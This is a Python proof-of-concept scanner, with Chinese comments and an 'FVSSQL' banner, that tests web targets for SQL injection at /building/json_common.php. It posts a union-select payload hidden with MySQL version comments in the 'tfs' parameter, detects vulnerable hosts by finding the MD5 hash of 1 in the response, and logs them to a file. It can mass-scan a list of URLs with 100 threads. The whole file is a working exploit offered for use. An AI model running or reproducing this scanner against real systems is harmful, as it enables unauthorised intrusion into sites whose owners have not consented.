import requests,argparse,sys
from multiprocessing.dummy import Pool
#忽略警告
requests.packages.urllib3.disable_warnings()

def banner():
    banner = """"

███████╗██╗   ██╗███████╗ ██████╗ ██╗     
██╔════╝██║   ██║██╔════╝██╔═══██╗██║     
█████╗  ██║   ██║███████╗██║   ██║██║     
██╔══╝  ╚██╗ ██╔╝╚════██║██║▄▄ ██║██║     
██║      ╚████╔╝ ███████║╚██████╔╝███████╗
╚═╝       ╚═══╝  ╚══════╝ ╚══▀▀═╝ ╚══════╝                                                                                                                  
                             version:1.0
    """
    print(banner)

def main():
    banner()
    parser = argparse.ArgumentParser(description='FVSSQL! ')
    parser.add_argument('-u','--url',dest='url',type=str,help='input link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    #判断输入的参数是单个还是文件
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        #多线程
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    #构造的POC
    url = target+'/building/json_common.php'
    headers = {
		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0",
		"Content-Length": "83",
		"Connection": "close",
		"Content-Type": "application/x-www-form-urlencoded",
		"Upgrade-Insecure-Requests": "1",
		"Accept-Encoding": "gzip, deflate"
	}
    data = "tfs=city` where cityId =-1 /*!50000union*/ /*!50000select*/1,2,MD5(1) ,4#|2|333"
    res = requests.get(url,verify=False,timeout=5)
    try:
        if res.status_code == 200:
            res1 = requests.post(url,headers=headers,data=data,verify=False,timeout=5)
            if 'c4ca4238a0b923820dcc509a6f75849' in res1.text:
                print(f"[+]该url存在漏洞{target}")
                with open("result.txt", "a+", encoding="utf-8") as f:
                    f.write(target+"\n")
            else:
                print(f"[-]该url不存在漏洞{target}")
    except Exception as e:
        print(f"[*]该url存在问题{target}"+e)

if __name__ == '__main__':
    main()